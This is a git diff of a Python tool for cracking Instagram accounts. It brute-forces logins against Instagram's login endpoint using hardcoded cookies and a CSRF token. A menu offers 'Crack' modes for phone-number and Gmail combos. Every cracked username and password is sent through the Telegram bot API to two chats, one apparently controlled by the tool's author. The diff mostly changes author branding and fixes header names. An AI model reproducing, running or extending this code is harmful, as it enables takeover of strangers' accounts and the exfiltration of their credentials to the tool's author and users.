@@ -19,7 +19,7 @@ num = '''\033[32m 770 + 771 + 772 +773 +774 + 750 + 751 +752 +753 +754 + 780 + 7
 '''
 url="https://www.instagram.com/accounts/login/ajax/"
 headers={
-    'accept': '*/*',hhggttff
+    'accept': '*/*',
     'accept-encoding': 'gzip, deflate, br',
     'accept-language': 'en-US,en;q=0.9',
     'content-length': '282',
@@ -27,11 +27,11 @@ headers={
     'cookie': 'csrftoken=Z23MdmsOaneIBPSuevdvZ029aMVWl6vw; mid=YJHiTgALAAGMKBeVSlMKDoCAq3cC; ig_did=B77ECEEB-5C81-43CC-AA42-7108227B197C; ig_nrcb=1',
     'origin': 'https://www.instagram.com',
     'referer': 'https://www.instagram.com/',
-    'sec-cfffwtwu2uh-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
+    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
     'sec-ch-ua-mobile': '?0',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
-    'sec-fetcvvqwgwwh-site': 'same-origin',
+    'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Linux; U; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13',
     'x-csrftoken': 'Z23MdmsOaneIBPSuevdvZ029aMVWl6vw',
     'x-ig-app-id': '936619743392459',
@@ -44,7 +44,9 @@ banek='''\x1b[1;97m
  [\033[32m2\x1b[1;97m] - Crack RAQAM+RAQAM
  [\033[32m3\x1b[1;97m] - Crack GMAIL+RAQAM
  [\033[32m4\x1b[1;97m] - Crack GMAIL+PASS
+ [\033[32m5\x1b[1;97m] - COMBO:NUMBER [Eror]
  [\033[32m0\x1b[1;97m] - Exit Tool
+
 '''
 logo = '''\x1b[1;92m
 
@@ -58,11 +60,13 @@ logo = '''\x1b[1;92m
                                                                
                                                                           
 
+ 
+ Auther : Fara Coder
  github : https://github.com/fardinHack
- Auther : i4m_REX
- Telegram Channal : IM_EROR_HACKER
+ Telegram : https://t.me/BESTxHACKER
+  Nrx : 0$
  ---------------------------------------------------------------------
- Pleas wait 1h or 2h Thank you for using it
+Note : chaware bka 1h or 2h bo wasatandne CTR+z DabGra
  '''
 logo2 = '\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
 
@@ -172,7 +176,7 @@ def crack():
 			print('\033[93m Checkpoint : '+str(r2))
 			print('\033[31m Bad : '+str(r3))
 			print(logo2)
-			sender =user+' : '+pas
+			sender =user+'HI NEW INSTAGRAM :BY faRa coder '+pas
 			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender
 			response = requests.get(send_telegram)
 			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + sender
@@ -183,7 +187,7 @@ def crack():
 			print(logo)
 			print(logo2)
 			print('\033[32m Hacked : '+str(r1))
-			print('\033[93m CP : '+str(r2))
+			print('\033[93m Checkpoint : '+str(r2))
 			print('\033[31m Bad : '+str(r3))
 			print(logo2)
 		
@@ -194,7 +198,7 @@ def crack():
 			print(logo)
 			print(logo2)
 			print('\033[32m Hacked : '+str(r1))
-			print('\033[93m CP : '+str(r2))
+			print('\033[93m Checkpoint : '+str(r2))
 			print('\033[31m Bad : '+str(r3))
 			print(logo2)
 			print(reba)
@@ -212,6 +216,10 @@ def crack():
 			print('\033[93m Checkpoint : '+str(r2))
 			print('\033[31m Bad : '+str(r3))
 			print(logo2)
+
+    
+
+
 
 
 
